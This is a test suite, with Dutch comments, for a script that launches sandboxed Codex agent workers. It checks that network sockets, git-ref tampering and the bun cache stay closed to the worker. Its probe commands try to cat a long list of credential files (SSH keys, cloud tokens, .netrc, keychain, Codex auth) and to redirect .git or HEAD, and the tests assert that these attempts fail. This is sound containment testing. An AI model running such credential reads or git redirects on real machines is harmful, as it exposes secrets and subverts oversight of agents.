    const tak = git(wt, "symbolic-ref", "--short", "HEAD").stdout.toString().trim();
    expect(tak).not.toBe("");
    expect(codex(["--map", wt]).code).toBe(0);
    const id = () => JSON.parse(readFileSync(join(idDir(), idBestanden()[0]!), "utf8")) as { tak?: string; naam: string };
    expect(id()).toMatchObject({ naam: "cx1", tak });
    rmSync(idDir(), { recursive: true, force: true });
    git(wt, "checkout", "-q", "--detach");
    expect(codex(["--map", wt]).code).toBe(0);
    expect(id().tak).toBeUndefined();
  });

  test("M3: de profielregel zet <worktree>/.codex op read; een bestaande .codex (ook niet-getrackt, ook een symlink) weigert spawn", () => {
    writeFileSync(join(dir, "pane.txt"), "Ask Codex\n• Ran ls\n");
    const r = codex(["--map", wt, "--droog"]);
    const fs = /-c 'permissions\.lab-werker\.filesystem=\{([^']*)\}'/.exec(r.uit)?.[1] ?? "";
    expect(fs.split(",").map((x) => x.replace(/"/g, ""))).toContain(`${realpathSync(wt)}/.codex=read`);
    symlinkSync(dir, join(wt, ".codex"));
    const s2 = codex(["--map", wt, "--droog"]);
    expect(s2.code).toBe(1);
    expect(s2.fout).toMatch(/\.codex bestaat/);
    expect(idBestanden()).toEqual([]);
  });

  test("Z1: de werker krijgt een eigen tmp-map als enige tmp-root; TMPDIR wijst ernaar; /tmp en de TMPDIR van de lead zijn niet schrijfbaar", () => {
    writeFileSync(join(dir, "pane.txt"), "Ask Codex\n• Ran ls\n");
    const lt = join(dir, "lead-tmp");
    mkdirSync(lt);
    const r = codex(["--map", wt, "--droog"], { TMPDIR: lt });
    const fs = /-c 'permissions\.lab-werker\.filesystem=\{([^']*)\}'/.exec(r.uit)?.[1] ?? "";
    const regels = fs.split(",").map((x) => x.replace(/"/g, ""));
    const tmp = realpathSync(werkWortel());
    expect(regels).toContain(`${tmp}/lab-werker-cx1=write`);
    expect(regels).not.toContain(`${tmp}=write`);
    expect(regels).not.toContain(`${realpathSync("/tmp")}=write`);
    expect(regels.some((x) => x.startsWith(`${realpathSync(lt)}=`))).toBe(false);
    expect(r.uit).toContain(`TMPDIR=${tmp}/lab-werker-cx1 `);
    expect(codex(["--map", wt, "--t3", "--droog"]).uit).not.toContain("TMPDIR=");
  });

  // Echte afdwinging (zoals hierboven, nep-Responses-server): met netwerk uit geven een unix-socket (stand-in), een tmux-socket
  // (wegwerp-tmux via -S) en een uitgaande TCP-verbinding EPERM; met --netwerk slagen ze (positieve controle, de omweg uit de README).
  const netwerkProef = async (extra: string[], eigenShell?: (thuis: string) => string, metHooks = false, naSpawn?: () => void): Promise<string> => {
    const codexBin = Bun.which("codex");
    writeFileSync(join(dir, "pane.txt"), "Ask Codex\n• Ran ls\n");
    const thuis = join(dir, "thuis-net");
    mkdirSync(thuis, { recursive: true });
    // Een kort pad in de tmp-map van de test (een unix-socket-pad is op macOS hooguit 104 tekens), tevens de tmp-wortel van de werker.
    const kort = realpathSync(mkdtempSync(join(tmpdir(), "nw-")));
    const sock = join(kort, "s.sock");
    const tsock = join(kort, "t.sock");
    const unix = Bun.listen({ unix: sock, socket: { data() {} } });
    const tcp = Bun.listen({ hostname: "127.0.0.1", port: 0, socket: { data() {} } });
    Bun.spawnSync(["tmux", "-S", tsock, "-f", "/dev/null", "new-session", "-d", "-s", "nw"], { env: { PATH: process.env.PATH ?? "", HOME: thuis } });
    // werktmp: de eigen tmp-map van de werker bestaat (spawn maakt hem in een echte run); /tmp zelf en de map van de test niet schrijfbaar
    const werktmp = join(kort, "lab-werker-nwproef");
    mkdirSync(werktmp, { recursive: true });
    const shell = eigenShell?.(thuis) ?? [
      `nc -U -w1 ${sock} </dev/null; echo SOCK-RC=$?`,
      `tmux -S ${tsock} list-sessions >/dev/null; echo TMUX-RC=$?`,
      `nc -z -w1 127.0.0.1 ${tcp.port}; echo TCP-RC=$?`,
      `mkdir -p ${wt}/.codex; echo CODEXDIR-RC=$?`,
      `touch ${kort}/x; echo TMPROOT-RC=$?`,
      `touch ${werktmp}/x; echo WERKTMP-RC=$?`,
    ].join("; ");
    let cArgs: string[] = [];
    let verzoeken = 0;
    let uitvoer = "";
    const server = Bun.serve({
      port: 0,
      hostname: "127.0.0.1",
      async fetch(req) {
        const body = await req.text();
        if (!new URL(req.url).pathname.endsWith("/responses")) return new Response("{}", { status: 404 });
        verzoeken++;
        const sse = (e: string, d: object) => `event: ${e}\ndata: ${JSON.stringify({ type: e, ...d })}\n\n`;
        let uit = sse("response.created", { response: { id: `r${verzoeken}`, status: "in_progress" } });
        const item =
          verzoeken === 1
            ? { type: "function_call", id: "fc_1", call_id: "call_1", name: "exec_command", arguments: JSON.stringify({ cmd: shell }) }
            : { type: "message", id: "m_2", role: "assistant", content: [{ type: "output_text", text: "klaar" }] };
        if (verzoeken === 2) {
          const o = (JSON.parse(body).input as { type?: string; output?: unknown }[]).find((i) => i.type === "function_call_output");
          uitvoer = String(o?.output ?? "");
        }
        uit += sse("response.output_item.added", { output_index: 0, item: verzoeken === 1 ? item : { ...item, content: [] } }) + sse("response.output_item.done", { output_index: 0, item });
        uit += sse("response.completed", { response: { id: `r${verzoeken}`, status: "completed", usage: { input_tokens: 1, output_tokens: 1, total_tokens: 2 } } });
        return new Response(uit, { headers: { "content-type": "text/event-stream" } });
      },
    });
    try {
      const ch = join(dir, "codex-net-home");
      mkdirSync(ch, { recursive: true });
      writeFileSync(join(ch, "config.toml"), `model = "nep"\nmodel_provider = "nep"\n[model_providers.nep]\nname = "nep"\nbase_url = "http://127.0.0.1:${server.port}/v1"\nwire_api = "responses"\nrequires_openai_auth = false\n`);
      // Met hooks: de echte hooks van deze branch (de installer, met trust) in de wegwerp-CODEX_HOME; spawn leest dan dezelfde CODEX_HOME.
      if (metHooks) {
        const inst = Bun.spawnSync([process.execPath, join(import.meta.dir, "hooks", "codex-installeer.ts"), "--codex-home", ch, "--doel", join(ch, "hooks", "lab-lead-hooks")], { env: { PATH: process.env.PATH ?? "", HOME: thuis, CODEX_HOME: ch } });
        expect(inst.stderr.toString() + inst.stdout.toString()).toMatch(/trusted|vertrouwd|geïnstalleerd|ok/i);
        expect(inst.exitCode).toBe(0);
      }
      const r = codex(["--map", wt, "--droog", ...extra], { TMPDIR: join(dir, "sbtmp-net"), HOME: thuis, LAB_WERKER_TMPWORTEL: kort, ...(metHooks ? { CODEX_HOME: ch } : {}) }, "nwproef");
      expect(r.code, r.fout).toBe(0);
      naSpawn?.();
      cArgs = [...r.uit.matchAll(/-c '((?:default_permissions|permissions\.)[^']*)'/g)].map((m) => m[1]!);
      const p = Bun.spawn([codexBin!, "exec", "--skip-git-repo-check", ...cArgs.flatMap((c) => ["-c", c]), "doe"], { cwd: wt, env: { PATH: process.env.PATH ?? "", HOME: thuis, CODEX_HOME: ch, ...(metHooks ? { LAB_LEAD_STAAT: staat } : {}) }, stdin: "ignore", stdout: "pipe", stderr: "pipe" });
      const timer = setTimeout(() => p.kill(), 90_000); // echte-klok: een echte codex-run, geen testklok
      await p.exited;
      clearTimeout(timer);
      // de hook-regels van codex zelf ("hook: SessionStart Completed", "hook: PreToolUse Blocked", ...)
      if (metHooks) uitvoer += `\nHOOKS\n${(await new Response(p.stderr).text()).split("\n").filter((l) => l.startsWith("hook: ")).join("\n")}\n`;
    } finally {
      server.stop(true);
      unix.stop(true);
      tcp.stop(true);
      rmSync(werktmp, { recursive: true, force: true });
      rmSync(join(wt, ".codex"), { recursive: true, force: true });
      Bun.spawnSync(["tmux", "-S", tsock, "kill-server"], { env: { PATH: process.env.PATH ?? "" } });
      rmSync(kort, { recursive: true, force: true });
    }
    return uitvoer;
  };

  test("netwerk uit (echte codex): unix-socket, tmux-socket en uitgaand TCP geven EPERM; met --netwerk slagen ze; .codex en /tmp blijven dicht", async () => {
    // Alleen lokaal gemeten (macOS-seatbelt met de echte codex): in CI bewijst dit niets, daar slaat hij over.
    if (process.platform !== "darwin" || !Bun.which("codex") || !Bun.which("tmux") || !Bun.which("nc")) {
      console.log("netwerk-afdwinging niet getoetst: geen macOS, codex, tmux of nc");
      return;
    }
    const rc = (u: string, k: string) => /^(\d+)$/.exec(new RegExp(`${k}=(\\d+)`).exec(u)?.[1] ?? "")?.[1];
    const uit = await netwerkProef([]);
    for (const k of ["SOCK-RC", "TMUX-RC", "TCP-RC"]) expect([k, rc(uit, k)]).not.toEqual([k, "0"]);
    for (const k of ["SOCK-RC", "TMUX-RC", "TCP-RC"]) expect([k, rc(uit, k) !== undefined]).toEqual([k, true]); // de probe draaide echt
    expect(uit).toMatch(/[Oo]peration not permitted/);
    const aan = await netwerkProef(["--netwerk"]);
    for (const k of ["SOCK-RC", "TMUX-RC", "TCP-RC"]) expect([k, rc(aan, k)]).toEqual([k, "0"]);
    // onafhankelijk van het netwerk: .codex aanmaken en /tmp-root schrijven faalt, de eigen tmp-map werkt
    for (const u of [uit, aan]) {
      expect(rc(u, "CODEXDIR-RC")).not.toBe("0");
      expect(rc(u, "TMPROOT-RC")).not.toBe("0");
      expect(rc(u, "WERKTMP-RC")).toBe("0");
    }
  }, 240_000);

  test("profiel (echte codex): .git, HEAD en refs/replace zijn read-only maar commit werkt; Brians inloggegevens zijn onleesbaar (wegwerp-HOME met nepbestanden)", async () => {
    // Alleen lokaal gemeten (macOS-seatbelt met de echte codex). De nepbestanden staan in een wegwerp-HOME: nooit de echte ~/.ssh e.d. lezen.
    if (process.platform !== "darwin" || !Bun.which("codex") || !Bun.which("tmux") || !Bun.which("nc")) {
      console.log("profiel niet getoetst: geen macOS, codex, tmux of nc");
      return;
    }
    const gitUit = (...a: string[]) => git(wt, ...a).stdout.toString().trim();
    const c = realpathSync(gitUit("rev-parse", "--path-format=absolute", "--git-common-dir"));
    const e = realpathSync(gitUit("rev-parse", "--path-format=absolute", "--absolute-git-dir"));
    const m = realpathSync(wt);
    const geheimen = [".claude/projects/p.jsonl", ".claude/.credentials.json", ".claude.json", ".config/glab-cli/config.yml", ".gnupg/pubring.kbx", ".config/gcloud/creds.db", "Library/Application Support/com.vercel.cli/auth.json", ".ssh/id_nep", ".config/gh/hosts.yml", ".netrc", ".git-credentials", ".aws/credentials", ".azure/token", ".kube/config", ".docker/config.json", ".npmrc", ".config/op/sessie", "Library/Keychains/login.keychain-db"];
    const thuis = join(dir, "thuis-net");
    for (const g of geheimen) {
      mkdirSync(dirname(join(thuis, g)), { recursive: true });
      writeFileSync(join(thuis, g), "NEPGEHEIM\n");
    }
    writeFileSync(join(thuis, "gewoon.txt"), "gewoon\n");
    // CODEX_HOME van de test (niet ~/.codex): wat de shell van de werker niet mag lezen, en wat wel
    const chGeheim = ["sessions/s1.jsonl", "archived_sessions/a1.jsonl", "history.jsonl", "log/codex.log", "state_5.sqlite", "state_5.sqlite-wal", "config.toml", "config.toml.voor-peerbus", "auth.json"].map((f) => join(codexHome, f));
    // sqlite-bestanden en een onbekend bestand die pas na de start van spawn ontstaan: de hele map is dicht, dus ook die
    const chLaat = ["state_9.sqlite", "state_9.sqlite-wal", "state_9.sqlite-shm", "logs_3.sqlite", "nieuw/ding.txt"].map((f) => join(codexHome, f));
    const chLeesbaar = ["skills/s.md", "shell_snapshots/snap.sh", "prompts/p.md", "rules/r.md", "AGENTS.md"].map((f) => join(codexHome, f));
    for (const f of [...chGeheim, ...chLeesbaar]) {
      mkdirSync(dirname(f), { recursive: true });
      if (!existsSync(f)) writeFileSync(f, "NEPGEHEIM\n");
    }
    const cache = join(thuis, ".bun", "install", "cache");
    mkdirSync(cache, { recursive: true });
    const gc = "git -c user.name=t -c user.email=t@t";
    const uit = await netwerkProef([], (h) =>
      [
        `echo x > ${m}/f; echo WRITE-RC=$?`,
        `${gc} add f; echo ADD-RC=$?`,
        `${gc} commit -q -m probe; echo COMMIT-RC=$?`,
        `${gc} update-ref refs/replace/${"a".repeat(40)} HEAD; echo REPLACE-RC=$?`,
        `echo 'ref: refs/heads/andere' > ${e}/HEAD; echo HEAD-RC=$?`,
        `echo 'gitdir: /nergens' > ${m}/.git; echo DOTGIT-RC=$?`,
        `mkdir -p ${c}/refs/replace/x; echo REPLACEDIR-RC=$?`,
        `cat ${h}/gewoon.txt >/dev/null; echo GEWOON-RC=$?`,
        ...geheimen.map((g, i) => `cat "${h}/${g}" >/dev/null; echo GEHEIM${i}-RC=$?`),
        ...chGeheim.map((f, i) => `cat ${f} >/dev/null; echo CHGEHEIM${i}-RC=$?`),
        ...chLaat.map((f, i) => `cat ${f} >/dev/null; echo CHLAAT${i}-RC=$?`),
        ...chLeesbaar.map((f, i) => `cat ${f} >/dev/null; echo CHLEES${i}-RC=$?`),
        `touch ${cache}/pakket; echo CACHE-RC=$?`,
      ].join("; "),
      false,
      () => {
        for (const f of chLaat) {
          mkdirSync(dirname(f), { recursive: true });
          writeFileSync(f, "NEPGEHEIM\n");
        }
      },
    );
    const rc = (k: string) => new RegExp(`${k}=(\\d+)`).exec(uit)?.[1];
    // positieve controles: het werkt wel, en gewone bestanden in HOME blijven leesbaar (denylist, geen allowlist)
    for (const k of ["WRITE-RC", "ADD-RC", "COMMIT-RC", "GEWOON-RC"]) expect([k, rc(k)]).toEqual([k, "0"]);
    // de aanvallen: replace-ref, HEAD omleggen, .git omleggen
    for (const k of ["REPLACE-RC", "HEAD-RC", "DOTGIT-RC", "REPLACEDIR-RC"]) expect([k, rc(k) !== undefined && rc(k) !== "0"]).toEqual([k, true]);
    for (let i = 0; i < geheimen.length; i++) expect([geheimen[i], rc(`GEHEIM${i}-RC`) !== undefined && rc(`GEHEIM${i}-RC`) !== "0"]).toEqual([geheimen[i], true]);
    for (let i = 0; i < chGeheim.length; i++) expect([chGeheim[i], rc(`CHGEHEIM${i}-RC`) !== undefined && rc(`CHGEHEIM${i}-RC`) !== "0"]).toEqual([chGeheim[i], true]);
    for (let i = 0; i < chLaat.length; i++) expect([chLaat[i], rc(`CHLAAT${i}-RC`) !== undefined && rc(`CHLAAT${i}-RC`) !== "0"]).toEqual([chLaat[i], true]);
    for (let i = 0; i < chLeesbaar.length; i++) expect([chLeesbaar[i], rc(`CHLEES${i}-RC`)]).toEqual([chLeesbaar[i], "0"]);
    // de bun-cache is zonder --netwerk niet schrijfbaar (een vervangen pakket zou door de volgende install van de lead gelinkt worden)
    expect(rc("CACHE-RC") !== undefined && rc("CACHE-RC") !== "0").toBe(true);
    expect(existsSync(join(cache, "pakket"))).toBe(false);
    // positieve controle: met --netwerk (de werker installeert zelf) is hij wel schrijfbaar
    const aan = await netwerkProef(["--netwerk"], () => `touch ${cache}/pakket; echo CACHE-RC=$?`);
    expect(/CACHE-RC=(\d+)/.exec(aan)?.[1]).toBe("0");
    rmSync(join(cache, "pakket"), { force: true });
    expect(uit).not.toContain("NEPGEHEIM");
    expect(existsSync(join(c, "refs", "replace", "a".repeat(40)))).toBe(false);
    expect(readFileSync(join(e, "HEAD"), "utf8")).not.toContain("andere");
    expect(readFileSync(join(wt, ".git"), "utf8")).toContain("gitdir:");
    expect(readFileSync(join(wt, ".git"), "utf8")).not.toContain("nergens");
  }, 240_000);

  // spawn.sh draait meerdere keren; 5 s standaard is te krap onder belasting (27 okt, load 13)
  test("hooks met de ~/.codex-denylist (echte codex, wegwerp-CODEX_HOME): SessionStart/UserPromptSubmit/PreToolUse draaien en grenzen.sh weigert een verboden aanroep", async () => {
    // Alleen lokaal gemeten (macOS-seatbelt met de echte codex). De hooks draaien buiten de sandbox (app-server); dit toont dat de
    // denylist op sessions/, config.toml enz. de beleidslaag niet stil uitzet.
    if (process.platform !== "darwin" || !Bun.which("codex") || !Bun.which("tmux") || !Bun.which("nc")) {
      console.log("hooks niet getoetst: geen macOS, codex, tmux of nc");
      return;
    }
    const uit = await netwerkProef([], () => "rg foo . ; echo NA-RG-RC=$?", true);
    // SessionStart en UserPromptSubmit draaien (Completed, niet Failed) en PreToolUse is voltooid
    for (const h of ["SessionStart", "UserPromptSubmit", "PreToolUse", "Stop"]) expect(uit).toContain(`hook: ${h} Completed`);
    expect(uit).not.toMatch(/hook: \w+ Failed/);
    // grenzen.sh blokkeerde het verboden commando: de melding komt terug en de shell draaide het niet (geen uitvoer NA-RG-RC=<getal>)
    expect(uit).toMatch(/Command blocked by PreToolUse hook: Geweigerd door grenzen\.sh: recursief zoeken/);
    expect(uit).toContain("hook: PreToolUse Blocked");
    expect(uit).not.toMatch(/NA-RG-RC=\d/);
  }, 240_000);

  test("hosted web search: tmux zet hem uit met -c (ook zonder MCP, ook als de config hem aanzet); T3 weigert als de config hem aanzet", () => {
    writeFileSync(join(dir, "pane.txt"), "Ask Codex\n• Ran ls\n");
    const UIT = `-c 'web_search="disabled"'`;
    // tmux: altijd mee, nooit --search; met en zonder peers-MCP
    expect(codex(["--map", wt, "--droog"], { LAB_PEERS_SERVER: join(dir, "bestaat-niet.ts") }).uit).toContain(UIT);
    const server = join(dir, "server.ts");
    writeFileSync(server, "// nep\n");
    const met = codex(["--map", wt, "--droog"], { LAB_PEERS_SERVER: server });
    expect(met.uit).toContain(UIT);
    expect(met.uit).not.toContain("--search");
    // tmux met een config die hem aanzet: het -c wint, dus geen weigering
    schrijfConfig({ bovenaan: 'web_search = "live"' });
    expect(codex(["--map", wt, "--droog"]).uit).toContain(UIT);
    // T3: geen -c mogelijk, dus weigeren als de config hem aanzet (ook --droog); niets geschreven of gestart
    for (const bovenaan of ['web_search = "live"', 'web_search = "cached"', 'web_search = "onbekend"', "web_search = true", "[features]\nweb_search_cached = true", "[tools]\nweb_search = true", "[tools.web_search]\ncontext_size = \"low\"", "[features]\nweb_search_request = true"]) {
      schrijfConfig({ bovenaan: bovenaan.startsWith("[") ? "" : bovenaan });
      if (bovenaan.startsWith("[")) appendFileSync(join(codexHome, "config.toml"), `\n${bovenaan}\n`);
      for (const extra of [["--t3"], ["--t3", "--droog"]]) {
        const r = codex(["--map", wt, ...extra]);
        expect(r.code).toBe(1);
        expect(r.fout).toMatch(/hosted web search kan voor een T3-thread niet uit/);
        expect(r.fout).not.toMatch(/Codex-config niet in orde|codex-installeer/);
        expect(r.fout).toMatch(/web_search = "disabled"/);
      }
    }
    expect(idBestanden()).toEqual([]);
    expect(log("t3.log")).toBe("");
    // T3 met de sleutel uit of zonder sleutel start wel
    for (const bovenaan of ['web_search = "disabled"', ""]) {
      schrijfConfig({ bovenaan });
      expect(codex(["--map", wt, "--t3", "--droog"]).code).toBe(0);
    }
    // een <worktree>/.codex (project-config) wordt geweigerd, ook als hij hem uitzet: zijn mcp_servers draaien buiten de sandbox
    mkdirSync(join(wt, ".codex"));
    writeFileSync(join(wt, ".codex", "config.toml"), 'web_search = "disabled"\n');
    for (const extra of [[], ["--t3"], ["--droog"], ["--t3", "--droog"]]) {
      const proj = codex(["--map", wt, ...extra]);
      expect(proj.code).toBe(1);
      expect(proj.fout).toMatch(/\.codex bestaat/);
    }
    expect(idBestanden()).toEqual([]);
    rmSync(join(wt, ".codex"), { recursive: true });
    expect(codex(["--map", wt, "--t3", "--droog"]).code).toBe(0);
  }, 60_000);

  test("tmux: spawn zet de upstream van de werkertak vooraf (.git/config is read-only in de sandbox); een bestaande eigen upstream blijft", () => {
    writeFileSync(join(dir, "pane.txt"), "Ask Codex\n");
    const cfg = (sleutel: string) => git(repo, "config", "--get", sleutel).stdout.toString().trim();
    const start = () => {
      rmSync(idDir(), { recursive: true, force: true });
      return codex(["--map", wt]);
    };
    // zonder remote origin: niets
    git(repo, "remote", "remove", "origin");
    start();
    expect(cfg("branch.werk.merge")).toBe("");
    git(repo, "remote", "add", "origin", origin);
    // droog schrijft niets
    codex(["--map", wt, "--droog"]);
    expect(cfg("branch.werk.merge")).toBe("");
    // geen upstream: origin + refs/heads/<tak>, ook als de tak op origin nog niet bestaat
    start(); // de nep-pane toont geen tool-aanroep: exit 1 na de start is hier normaal
    expect(cfg("branch.werk.remote")).toBe("origin");
    expect(cfg("branch.werk.merge")).toBe("refs/heads/werk");
    // een verse agenttak vanaf origin/main (upstream main) wordt omgezet
    git(repo, "config", "branch.werk.merge", "refs/heads/main");
    start();
    expect(cfg("branch.werk.merge")).toBe("refs/heads/werk");
    // een andere, bewust gekozen upstream blijft staan
    git(repo, "config", "branch.werk.merge", "refs/heads/ander");
    start();
    expect(cfg("branch.werk.merge")).toBe("refs/heads/ander");
  });

  test("tmux in een eigen worktree schrijft de identiteit (0600 in een map 0700); een andere checkout krijgt niets", () => {
    writeFileSync(join(dir, "pane.txt"), "Ask Codex\n");
    const r = codex(["--map", wt]);
    expect(r.fout).not.toMatch(/hoofdcheckout/);
    const bestanden = idBestanden();
    expect(bestanden.length).toBe(1);
    const i = JSON.parse(readFileSync(join(idDir(), bestanden[0]), "utf8"));
    expect(i).toMatchObject({ naam: "cx1", rol: "agent", lead: "lead-x", opdracht: join(dir, "opdracht.md") });
    expect(typeof i.ts).toBe("number");
    expect(statSync(join(idDir(), bestanden[0])).mode & 0o777).toBe(0o600);
    expect(statSync(idDir()).mode & 0o777).toBe(0o700);
    // een tweede worktree en de hoofdcheckout hebben geen bestand: de hash hoort bij het pad van de checkout
    const wt2 = join(dir, "andere-worktree");
    git(repo, "worktree", "add", "-q", "-b", "werk2", wt2);
    expect(identiteitEnv({ LAB_LEAD_STAAT: staat }, wt2)).toEqual({});
    expect(identiteitEnv({ LAB_LEAD_STAAT: staat }, repo)).toEqual({});
    expect(identiteitEnv({ LAB_LEAD_STAAT: staat }, join(wt, "sub"))).toMatchObject({ LAB_AGENT_NAAM: "cx1", LAB_AGENT_ROL: "agent" });
  });

  test("M2: tmux weigert de hoofdcheckout en een map zonder eigen worktree (git-dir == git-common-dir), ook met --droog; er start niets", () => {
    writeFileSync(join(dir, "pane.txt"), "Ask Codex\n");
    const kaal = join(dir, "geen-git");
    mkdirSync(kaal);
    for (const map of [repo, kaal]) {
      for (const extra of [[], ["--droog"]]) {
        const r = codex(["--map", map, ...extra]);
        expect(r.code).toBe(1);
        expect(r.fout).toMatch(/eigen worktree als --map/);
      }
    }
    expect(idBestanden()).toEqual([]);
    expect(log("spawn.log")).toBe("");
  });

  test("g) onder /bin/bash 3.2 komt een niet-git-map er niet door (cd \"\" slaagt daar); een relatieve --map werkt", () => {
    const kaal = join(dir, "geen-git-32");
    mkdirSync(kaal);
    const bash32 = (map: string, cwd: string) => {
      const r = Bun.spawnSync(["/bin/bash", SPAWN, "--naam", "cx1", "--opdracht", opdracht(), "--lead", "lead-x", "--vendor", "codex", "--map", map, "--droog"], { cwd, env: omgeving(basis()) });
      return { code: r.exitCode, uit: r.stdout.toString(), fout: r.stderr.toString() };
    };
    const slecht = bash32(kaal, repo);
    expect(slecht.code).toBe(1);
    expect(slecht.fout).toMatch(/eigen worktree als --map/);
    expect(bash32(repo, repo).code).toBe(1);
    const ok = bash32("eigen-worktree", dir); // relatief pad
    expect(ok.code).toBe(0);
    expect(ok.uit).toContain(`codex -C ${realpathSync(wt)}`); // absoluut vóór codex -C
  });

  test("M1: zonder grenzen-hook in de Codex-config, of zonder geldige trusted_hash ervoor, start spawn niet (tmux, T3 en --droog)", () => {
    writeFileSync(join(dir, "pane.txt"), "Ask Codex\n• Ran ls\n");
    const gevallen: [Parameters<typeof schrijfConfig>[0], RegExp][] = [
      [{ grenzen: false }, /grenzen-hook .* ontbreekt/],
      [{ vertrouwd: false }, /niet vertrouwd/],
      [{ matcher: "Bash" }, /dekt Bash en apply_patch niet/],
      [{ matcher: "h" }, /dekt Bash en apply_patch niet/],
      [{ kopieAf: true }, /wijkt af van de repo/],
    ];
    for (const [conf, re] of gevallen) {
      schrijfConfig(conf);
      for (const extra of [[], ["--droog"], ["--t3"]]) {
        const r = codex(["--map", wt, ...extra]);
        expect(r.code).toBe(1);
        expect(r.fout).toMatch(/Codex-config niet in orde/);
        expect(r.fout).toMatch(re);
      }
    }
    expect(idBestanden()).toEqual([]);
    expect(log("spawn.log")).toBe("");
    expect(log("t3.log")).toBe("");
    // de config ontbreekt helemaal
    rmSync(join(codexHome, "config.toml"));
    expect(codex(["--map", wt]).fout).toMatch(/bestaat niet/);
    // en met de entry plus trust start hij wel
    schrijfConfig();
    expect(codex(["--map", wt]).code).toBe(0);
    expect(idBestanden().length).toBe(1);
  }, 60_000); // spawn.sh draait hier meerdere keren; 5 s is te krap onder belasting (poort 27 okt)

  test("Z6: een mislukte start laat geen identiteitsbestand achter (tmux zonder pane-id, T3 zonder thread)", () => {
    schrijfBin("kapot-spawn.sh", "#!/usr/bin/env bash\nexit 1\n");
    const t = codex(["--map", wt], { LAB_SPAWN_SCRIPT: join(bin, "kapot-spawn.sh") });
    expect(t.code).toBe(1);
    expect(t.fout).toMatch(/geen pane-id/);
    expect(idBestanden()).toEqual([]);
    schrijfBin("t3", "#!/usr/bin/env bash\ncase \"$1 $2\" in\n  \"thread list\") exit 0 ;;\n  \"thread start\") cat >/dev/null; echo kapot; exit 1 ;;\nesac\nexit 1\n");
    const r = codex(["--map", wt, "--t3"]);
    expect(r.code).toBe(1);
    expect(r.fout).toMatch(/thread starten mislukte/);
    expect(idBestanden()).toEqual([]);
  });

  test("K5: dezelfde naam mag niet opnieuw zolang de vorige spawn nog in het register leeft; wel na SessionEnd (weg)", () => {
    writeFileSync(join(dir, "pane.txt"), "Ask Codex\n• Ran ls\n");
    expect(codex(["--map", wt]).code).toBe(0);
    const spawnId = JSON.parse(readFileSync(join(idDir(), idBestanden()[0]), "utf8")).spawn_id;
    mkdirSync(join(staat, "register"), { recursive: true });
    writeFileSync(join(staat, "register", "lead.json"), JSON.stringify({ id: "lead", soort: "sessie", naam: "lead-x", rol: "lead", pane: "", toestand: "bezig", sinds: Date.now(), start: 1 })); // --lead moet in het register staan
    const rec = (toestand: string) => writeFileSync(join(staat, "register", "s1.json"), JSON.stringify({ id: "s1", soort: "sessie", naam: "cx1", spawn_id: spawnId, toestand }));
    rec("bezig");
    const r = codex(["--map", wt]);
    expect(r.code).toBe(1);
    expect(r.fout).toMatch(/sessie 'cx1' draait nog/);
    expect(JSON.parse(readFileSync(join(idDir(), idBestanden()[0]), "utf8")).spawn_id).toBe(spawnId); // het bestand is ongemoeid
    rec("weg");
    expect(codex(["--map", wt]).code).toBe(0);
  });

  test("een tweede sessie in dezelfde checkout wordt geweigerd; dezelfde naam mag opnieuw", () => {
    writeFileSync(join(dir, "pane.txt"), "Ask Codex\n");
    expect(codex(["--map", wt], {}, "cx1").fout).not.toMatch(/draagt al/);
    const r = codex(["--map", wt], {}, "cx2");
    expect(r.code).toBe(1);
    expect(r.fout).toMatch(/draagt al de identiteit van sessie 'cx1'/);
    expect(codex(["--map", wt], {}, "cx1").fout).not.toMatch(/draagt al/);
  });

  test("tmux: de Codex-vertrouwensvraag wordt gemeld en nooit beantwoord", () => {
    writeFileSync(join(dir, "pane.txt"), "Hooks need review\n  Review hooks\n");
    const r = codex(["--map", wt], { LAB_SPAWN_POLS: "1", WACHT_VERTROUWEN: "1" });
    expect(r.code).toBe(1);
    expect(r.fout).toContain("cx1 wacht op vertrouwen in pane %7");
    expect(log("tmux.log")).not.toContain("send-keys");
  });

  test("tmux: klaar bij 'Ask Codex'; het bewijs is een •-regel, niet ⏺", () => {
    writeFileSync(join(dir, "pane.txt"), "Ask Codex\n");
    const stil = codex(["--map", wt]);
    expect(stil.fout).toMatch(/geen tool-aanroep \(•\)/);
    expect(log("tmux.log")).toContain("send-keys");
    writeFileSync(join(dir, "pane.txt"), "Ask Codex\n• Ran ls\n");
    const ok = codex(["--map", wt]);
    expect(ok.code).toBe(0);
    expect(ok.uit.trim().split("\n").at(-1)).toBe("%7");
  });

  test("T3: weigert de hoofdcheckout; schrijft in een eigen worktree de identiteit met rol en thread-id, niet settings.local.json", () => {
    expect(codex(["--map", repo, "--t3"]).fout).toMatch(/hoofdcheckout/);
    expect(idBestanden()).toEqual([]);
    const r = codex(["--map", wt, "--t3", "--model", "gpt-6-luna"]);
    expect(r.fout).toBe("");
    expect(r.uit.trim().split("\n").at(-1)).toBe("t3:mcp:1234abcd-0000");
    expect(log("t3.log")).toContain(`thread start --title cx1 --provider codex --model gpt-6-luna ${wt} -`);
    expect(existsSync(join(wt, ".claude"))).toBe(false);
    const bestanden = idBestanden();
    expect(bestanden.length).toBe(1);
    expect(JSON.parse(readFileSync(join(idDir(), bestanden[0]), "utf8"))).toMatchObject({ naam: "cx1", rol: "agent", t3_thread: "mcp:1234abcd-0000" });
    expect(readFileSync(join(dir, "t3-stdin.txt"), "utf8")).toContain("met de tool send van MCP-server peers (naar: lead-x)");
  });

  test("T3 --droog schrijft niets; --meerdere geeft --vendor door", () => {
    const r = codex(["--map", wt, "--t3", "--droog"]);
    expect(r.uit).toContain("--provider codex");
    expect(idBestanden()).toEqual([]);
    const lijst = join(dir, "lijst.txt");
    writeFileSync(lijst, `a ${opdracht()}\n`);
    const m = draai(SPAWN, ["--meerdere", lijst, "--lead", "l", "--map", wt, "--vendor", "codex", "--droog"], basis());
    expect(m.code).toBe(0);
    expect(m.uit).toContain("(•)"); // het Codex-bewijs, niet ⏺: --vendor ging mee naar de deelaanroep
  });
});
